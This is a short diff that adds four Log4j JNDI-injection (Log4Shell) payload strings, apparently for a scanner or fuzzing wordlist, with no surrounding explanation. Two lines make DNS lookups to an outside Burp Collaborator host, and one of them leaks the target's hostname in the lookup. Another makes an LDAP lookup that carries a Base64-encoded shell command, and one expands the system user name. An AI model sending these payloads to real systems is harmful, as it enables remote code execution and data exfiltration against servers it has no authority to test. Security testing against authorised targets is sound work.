@@ -1,0 +1,4 @@
+${sys:user.name}
+${jndi:dns://108.61.10.10/b0cfhrc6ykk5tn914d8873fzwq2hq6.burpcollaborator.net}
+${jndi:dns://108.61.10.10/${env:HOSTNAME}.b0cfhrc6ykk5tn914d8873fzwq2hq6.burpcollaborator.net}
+${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC90b3RvCg==}
